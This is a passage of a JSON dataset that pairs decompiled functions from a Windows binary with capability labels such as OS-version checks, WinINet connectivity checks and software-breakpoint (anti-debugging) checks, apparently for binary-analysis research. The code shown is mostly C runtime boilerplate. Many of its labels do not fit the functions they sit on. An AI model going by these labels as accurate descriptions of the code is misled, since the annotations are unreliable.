*var_ch_2 = 0x40b29f;\n        var_34h = 1;\n    }\n    else {\n        pcStack40 = fcn.0040b2cb;\n        uStack36 = *0x441350;\n        uStack32 = var_20h;\n        puStack28 = var_ch_2;\n        uStack24 = var_1ch;\n        uStack20 = var_18h;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0040b204::var_28h_2;\n        var_30h = var_8h_3;\n        var_2ch = var_28h;\n        iVar1 = fcn.0040f262(*var_8h_3, &fcn.0040b204::var_30h);\n        (**(iVar1 + 0x74))();\n        var_34h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_34h;\n}\n",
        "token_count": 670
    },
    "0040b2cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040b2cb(int32_t param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7\n                 , uint param_8)\n\n{\n    uint uVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    int32_t arg_20h;\n    int32_t noname_8;\n    code *extraout_var;\n    code *UNRECOVERED_JUMPTABLE;\n    \n    if (*(param_2 + 8) == *0x441350) {\n        if ((*(param_1 + 4) & 0x66) == 0) {\n            noname_8 = 1;\n            arg_20h = *(param_2 + 0x18);\n            fcn.0040ce9f(param_1, *(param_2 + 0x10), param_3, 0, *(param_2 + 0xc), *(param_2 + 0x14), arg_20h, 1);\n            UNRECOVERED_JUMPTABLE = extraout_var;\n            if (*(param_2 + 0x24) == 0) {\n                arg_20h = param_2;\n                noname_8 = param_1;\n                fcn.0040b127(param_2, param_1);\n            }\n            fcn.0040b204(0x123, &stack0xfffffff8, 0, 0, 0, 0, 0, arg_20h, noname_8, unaff_EBX, UNRECOVERED_JUMPTABLE, \n                         unaff_EBP, unaff_retaddr, param_1, param_2, param_3, param_4, param_5, param_6, param_7, \n                         param_8);\n    // WARNING: Could not recover jumptable at 0x0040b375. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar1 = (*UNRECOVERED_JUMPTABLE)();\n            return uVar1;\n        }\n        *(param_2 + 0x24) = 1;\n    }\n    else {\n        *(param_1 + 4) = *(param_1 + 4) | 8;\n    }\n    return 1;\n}\n",
        "token_count": 525
    },
    "0040b440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040b440(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    \n    iVar2 = fcn.0040f262();\n    if (param_1 == *(iVar2 + 0x88)) {\n        iVar2 = fcn.0040f262();\n        *(iVar2 + 0x88) = *(param_1 + 4);\n        return;\n    }\n    iVar2 = fcn.0040f262();\n    iVar2 = *(iVar2 + 0x88);\n    do {\n        iVar3 = iVar2;\n        if (*(iVar3 + 4) == 0) {\n            fcn.0040f0bc(0x43b8b8, 8);\n            pcVar1 = *0x4418ec;\n            if (*0x4418ec != NULL) {\n                *(unaff_EBP + -4) = 0;\n                (*pcVar1)();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.0040f0bc(0x43b8a8, 8);\n            iVar2 = fcn.0040f262();\n            if (*(iVar2 + 0x6c) != 0) {\n                *(unaff_EBP + -4) = 0;\n                iVar2 = fcn.0040f262();\n                (**(iVar2 + 0x6c))();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.00411389(10);\n            fcn.00415f05(0x16);\n            fcn.0041135a(3);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = *(iVar3 + 4);\n    } while (param_1 != *(iVar3 + 4));\n    *(iVar3 + 4) = *(param_1 + 4);\n    return;\n}\n",
        "token_count": 452
    },
    "0040f544": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0040f544(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b8a8, 8);\n    iVar2 = fcn.0040f262();\n    if (*(iVar2 + 0x6c) != 0) {\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0040f262();\n        (**(iVar2 + 0x6c))();\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00411389(10);\n    fcn.00415f05(0x16);\n    fcn.0041135a(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 219
    },
    "0040b718": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_4h_2\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040b718(uint arg_8h_2, uint noname_1, uint arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t noname_5;\n    uint *noname_4;\n    uint16_t *puVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint var_34h_2;\n    uint var_34h;\n    uint var_28h;\n    uint var_20h_2;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h_2;\n    uint noname_8;\n    \n    noname_8 = 0x18;\n    noname_4 = &fcn.0040b718::var_4h_2;\n    var_4h_2 = 0x43af38;\n    fcn.0040f0bc();\n    *(unaff_EBP + -0x20) = 0;\n    iVar2 = fcn.0040f262();\n    iVar2 = *(iVar2 + 100);\n    *(unaff_EBP + -0x1c) = iVar2;\n    if (iVar2 != *0x44163c) {\n        iVar2 = fcn.0040de06();\n        *(unaff_EBP + -0x1c) = iVar2;\n    }\n    if (*(iVar2 + 0x14) == 0) {\n        puVar3 = *(unaff_EBP + 8);\n        uVar1 = *puVar3;\n        while (uVar1 != 0) {\n            uVar1 = *puVar3;\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                *puVar3 = uVar1 + 0x20;\n            }\n            puVar3 = puVar3 + 1;\n            uVar1 = *puVar3;\n        }\n        goto code_r0x0040b82e;\n    }\n    noname_5 = fcn.0040fa1b(*(iVar2 + 0x14), 0x100, *(unaff_EBP + 8), 0xffffffff, 0, 0, *(iVar2 + 4), var_4h_2, noname_8\n                            , var_4h, arg_8h_2, noname_1, arg_8h, in_stack_00000010, in_stack_00000014, \n                            in_stack_00000018, in_stack_0000001c, in_stack_00000020, in_stack_00000024, \n                            in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, \n                            in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, \n                            in_stack_00000048, in_stack_0000004c, in_stack_00000050, in_stack_00000054);\n    *(unaff_EBP + -0x24) = noname_5;\n    if (noname_5 == 0) goto code_r0x0040b82e;\n    *(unaff_EBP + -4) = 0;\n    fcn.0040fc80();\n    *(unaff_EBP + -0x18) = &fcn.0040b718::var_4h_2;\n    *(unaff_EBP + -0x28) = &fcn.0040b718::var_4h_2;\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*0x10 == 0x8) {\n        noname_4 = fcn.0040b8de(noname_5 * 2);\n        *(unaff_EBP + -0x20) = 1;\n        if (noname_4 != NULL) goto code_r0x0040b7f5;\n    }\n    else {\ncode_r0x0040b7f5:\n        iVar2 = fcn.0040fa1b(*(iVar2 + 0x14), 0x100, *(unaff_EBP + 8), 0xffffffff, noname_4, noname_5, *(iVar2 + 4), \n                             var_4h_2, noname_8, var_4h, arg_8h_2, noname_1, arg_8h, in_stack_00000010, \n                             in_stack_00000014, in_stack_00000018, in_stack_0000001c, in_stack_00000020, \n                             in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, \n                             in_stack_00000034, in_stack_00000038, in_stack_0000003c, in_stack_00000040, \n                             in_stack_00000044, in_stack_00000048, in_stack_0000004c, in_stack_00000050, \n                             in_stack_00000054);\n        if (iVar2 != 0) {\n            fcn.0040f8fe(*(unaff_EBP + 8), noname_4);\n        }\n    }\n    if (*(unaff_EBP + -0x20) != 0) {\n        fcn.0040cfb5(noname_4);\n    }\ncode_r0x0040b82e:\n    *(unaff_EBP + -0x38) = 0x40b836;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1557
    },
    "0040b837": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040b837(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t arg_8h_00;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43af48, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((*0x4431fc == 3) && (arg_8h_00 <= *0x4431dc)) {\n        fcn.0040f088(4);\n        *(unaff_EBP + -4) = 0;\n        uVar1 = fcn.00410a2e(arg_8h_00);\n        *(unaff_EBP + -0x1c) = uVar1;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0040b8a9();\n        if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0040b8a0;\n    }\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = 1;\n    }\n    if (*0x4431fc != 1) {\n        arg_8h_00 = arg_8h_00 + 0xf & 0xfffffff0;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4431ec, 0, arg_8h_00);\ncode_r0x0040b8a0:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 384
    },
    "0040c34d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0040c34d(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_ESI;\n    uint8_t *unaff_EDI;\n    \n    iVar1 = *(unaff_ESI + 4);\n    if ((iVar1 != 0) && (*(iVar1 + 8) != '\\0')) {\n        if ((iVar1 != *(unaff_EDI + 4)) && (iVar1 = fcn.00411e40(iVar1 + 8, *(unaff_EDI + 4) + 8),  iVar1 != 0)) {\n            return 0;\n        }\n        if (((((*unaff_EDI & 2) != 0) && ((*unaff_ESI & 8) == 0)) || (((*param_1 & 1) != 0 && ((*unaff_ESI & 1) == 0))))\n           || (((*param_1 & 2) != 0 && ((*unaff_ESI & 2) == 0)))) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 245
    },
    "0040c46d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040c46d(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f262();\n    if (0 < *(iVar1 + 0x84)) {\n        iVar1 = fcn.0040f262();\n        *(iVar1 + 0x84) = *(iVar1 + 0x84) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040c4fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040c4fd(int32_t *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *param_1 + in_EAX;\n    if (-1 < param_1[1]) {\n        iVar1 = iVar1 + *(*(param_1[1] + in_EAX) + param_1[2]) + param_1[1];\n    }\n    return iVar1;\n}\n",
        "token_count": 106
    },
    "0040c866": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0040c866(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x38);\n    fcn.0040b440(*(unaff_EBP + -0x3c));\n    iVar1 = fcn.0040f262();\n    *(iVar1 + 0x7c) = *(unaff_EBP + -0x40);\n    iVar1 = fcn.0040f262();\n    *(iVar1 + 0x80) = *(unaff_EBP + -0x44);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((unaff_ESI[5] == 0x19930520 || (unaff_ESI[5] == 0x19930521)))) &&\n       ((*(unaff_EBP + -0x48) == 0 && (*(unaff_EBP + -0x20) != 0)))) {\n        iVar1 = fcn.0040b41f(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040b592();\n            fcn.0040c4b8(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "0040c8d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c8d5(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_ch_00;\n    uint uVar5;\n    uint8_t *extraout_ECX;\n    int32_t *extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t *arg_8h_00;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b020, 8);\n    puVar1 = *(unaff_EBP + 0xc);\n    iVar4 = *(unaff_EBP + 8);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && ((*(puVar1 + 3) & 0x80) == 0))))\n    goto code_r0x0040ca3f;\n    uVar2 = *puVar1;\n    arg_8h_00 = extraout_EDX;\n    if (-1 < uVar2) {\n        arg_8h_00 = puVar1[2] + 0xc + extraout_EDX;\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = *(iVar4 + 0x18);\n    if ((uVar2 & 8) == 0) {\n        if ((*extraout_ECX & 1) == 0) {\n            if (*(extraout_ECX + 0x18) == 0) {\n                iVar4 = fcn.00411fc8(uVar5, 1);\n                if ((iVar4 == 0) || (iVar4 = fcn.00411fe4(arg_8h_00, 1),  iVar4 == 0)) {\ncode_r0x0040ca36:\n                    fcn.0040f591();\n                }\n                else {\n                    uVar5 = *(extraout_ECX + 0x14);\n                    arg_ch_00 = fcn.0040c4fd();\n                    fcn.0040ada0(arg_8h_00, arg_ch_00, uVar5);\n                }\n            }\n            else {\n                iVar4 = fcn.00411fc8(uVar5, 1);\n                if (((iVar4 == 0) || (iVar4 = fcn.00411fe4(arg_8h_00, 1),  iVar4 == 0)) ||\n                   (iVar4 = fcn.00412000(*(extraout_ECX + 0x18)),  iVar4 == 0)) goto code_r0x0040ca36;\n                if ((*extraout_ECX & 4) == 0) {\n                    uVar5 = fcn.0040c4fd();\n                    fcn.0040b119(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n                else {\n                    uVar5 = fcn.0040c4fd(1);\n                    fcn.0040b120(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n            }\n        }\n        else {\n            iVar3 = fcn.00411fc8(uVar5, 1);\n            if ((iVar3 == 0) || (iVar3 = fcn.00411fe4(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0040ca36;\n            fcn.0040ada0(arg_8h_00, *(iVar4 + 0x18), *(extraout_ECX + 0x14));\n            if ((*(extraout_ECX + 0x14) == 4) && (*arg_8h_00 != 0)) goto code_r0x0040c94e;\n        }\n    }\n    else {\n        iVar3 = fcn.00411fc8(uVar5, 1);\n        if ((iVar3 == 0) || (iVar3 = fcn.00411fe4(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0040ca36;\n        *arg_8h_00 = *(iVar4 + 0x18);\ncode_r0x0040c94e:\n        iVar4 = fcn.0040c4fd();\n        *arg_8h_00 = iVar4;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x0040ca3f:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1056
    },
    "0040ca51": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ca51(int32_t **arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t *arg_8h_00;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        return 0;\n    }\n    arg_8h_00 = *arg_8h;\n    if ((arg_ch == 0) || (*(arg_ch + 8) == '\\0')) {\n        if ((((*arg_8h_00 != -0x1f928c9d) || (arg_8h_00[4] != 3)) ||\n            (((arg_8h_00[5] != 0x19930520 && (arg_8h_00[5] != 0x19930521)) || (arg_8h_00[7] != 0)))) ||\n           (iVar1 = fcn.0040f262(),  *(iVar1 + 0x7c) != 0)) {\n            iVar1 = fcn.0040f262();\n            *(iVar1 + 0x84) = *(iVar1 + 0x84) + 1;\n            return 1;\n        }\n    }\n    else if (((*arg_8h_00 == -0x1f928c9d) && (arg_8h_00[4] == 3)) &&\n            ((arg_8h_00[5] == 0x19930520 || (arg_8h_00[5] == 0x19930521)))) {\n        if (arg_8h_00[7] == 0) {\n            iVar1 = fcn.0040f262();\n            if (*(iVar1 + 0x7c) == 0) {\n                return 0;\n            }\n            iVar1 = fcn.0040f262();\n            arg_8h_00 = *(iVar1 + 0x7c);\n        }\n        var_14h = arg_10h | 0x80000000;\n        var_10h = arg_ch;\n        for (var_4h = **(arg_8h_00[7] + 0xc); 0 < var_4h; var_4h = var_4h + -1) {\n            iVar1 = fcn.0040c34d(arg_8h_00[7]);\n            if (iVar1 != 0) {\n                iVar1 = fcn.0040f262();\n                *(iVar1 + 0x84) = *(iVar1 + 0x84) + 1;\n                if (arg_14h == 0) {\n                    return 1;\n                }\n                fcn.0040c8d5(arg_8h_00, &var_14h);\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 668
    },
    "0040cb76": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cb76(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (in_ECX != 0) {\n        fcn.0040c8d5(arg_8h, unaff_EBX);\n    }\n    if (arg_1ch == 0) {\n        arg_1ch = unaff_ESI;\n    }\n    fcn.0040b127(arg_1ch, arg_8h);\n    fcn.0040c3ba(unaff_ESI, arg_10h, arg_14h, *unaff_EDI);\n    *(unaff_ESI + 8) = unaff_EDI[1] + 1;\n    iVar1 = fcn.0040c711(arg_8h, unaff_ESI, arg_ch, arg_14h, arg_18h, 0x100);\n    if (iVar1 != 0) {\n        fcn.0040b0e2(iVar1);\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "0040cbdd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0040cbdd(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint in_stack_00000024;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((*arg_8h != -0x7ffffffd) &&\n       (((iVar1 = fcn.0040f262(),  *(iVar1 + 0x74) == 0 ||\n         (iVar1 = fcn.0040b204(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h, unaff_ESI, var_8h, var_4h, \n                               unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                               arg_24h, in_stack_00000024),  iVar1 == 0)) &&\n        (piVar2 = fcn.0040b37d(arg_18h, arg_20h, arg_1ch, &var_4h, &var_8h),  var_4h < var_8h)))) {\n        do {\n            if (((*piVar2 <= arg_1ch) && (arg_1ch <= piVar2[1])) &&\n               ((iVar1 = *(piVar2[3] * 0x10 + piVar2[4] + -0xc),  iVar1 == 0 || (*(iVar1 + 8) == '\\0')))) {\n                fcn.0040cb76(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n            }\n            var_4h = var_4h + 1;\n            piVar2 = piVar2 + 5;\n        } while (var_4h < var_8h);\n    }\n    return;\n}\n",
        "token_count": 550
    },
    "0040ce9f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040ce9f(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    uint uVar1;\n    \n    if ((*arg_18h & 0x1fffffff) != 0x19930520) {\n        fcn.0040f591();\n    }\n    if ((*(arg_8h + 1) & 0x66) == 0) {\n        if (arg_18h[3] != 0) {\n            if (((*arg_8h == -0x1f928c9d) && (0x19930520 < arg_8h[5])) && (*(arg_8h[7] + 8) != NULL)) {\n                uVar1 = (**(arg_8h[7] + 8))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff)\n                ;\n                return uVar1;\n            }\n            fcn.0040cc9b(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n        }\n    }\n    else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n        fcn.0040c3ba(arg_ch, arg_14h, arg_18h, 0xffffffff);\n    }\n    return 1;\n}\n",
        "token_count": 382
    },
    "0040d026": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040d026(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43b040, 0x10);\n    *(unaff_EBP + -0x1c) = 0;\n    uVar1 = *(unaff_EBP + 0x10);\n    if ((uVar1 != 4) &&\n       (((*(unaff_EBP + 0x14) < 2 || (0x7fffffff < *(unaff_EBP + 0x14))) || ((uVar1 != 0 && (uVar1 != 0x40))))))\n    goto code_r0x0040d0f2;\n    *(unaff_EBP + 0x14) = *(unaff_EBP + 0x14) & 0xfffffffe;\n    piVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = piVar2;\n    fcn.0040d9b2(piVar2);\n    *(unaff_EBP + -4) = 0;\n    fcn.0040d102(piVar2);\n    fcn.00412018(piVar2);\n    *(piVar2 + 3) = *(piVar2 + 3) & 0xc2f3;\n    if ((uVar1 & 4) == 0) {\n        piVar3 = *(unaff_EBP + 0xc);\n        if (piVar3 != NULL) {\n            piVar2[3] = piVar2[3] | 0x500;\n            goto code_r0x0040d0d8;\n        }\n        piVar3 = fcn.0040b8de(*(unaff_EBP + 0x14));\n        *(unaff_EBP + 0xc) = piVar3;\n        if (piVar3 != NULL) {\n            *(piVar2 + 3) = *(piVar2 + 3) | 0x408;\n            goto code_r0x0040d0d8;\n        }\n        *0x4428dc = *0x4428dc + 1;\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\n    else {\n        piVar2[3] = piVar2[3] | 4;\n        piVar3 = piVar2 + 5;\n        *(unaff_EBP + 0xc) = piVar3;\n        *(unaff_EBP + 0x14) = 2;\ncode_r0x0040d0d8:\n        piVar2[6] = *(unaff_EBP + 0x14);\n        piVar2[2] = piVar3;\n        *piVar2 = piVar3;\n        piVar2[1] = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040d0f8();\ncode_r0x0040d0f2:\n    fcn.0040f0f7();\n    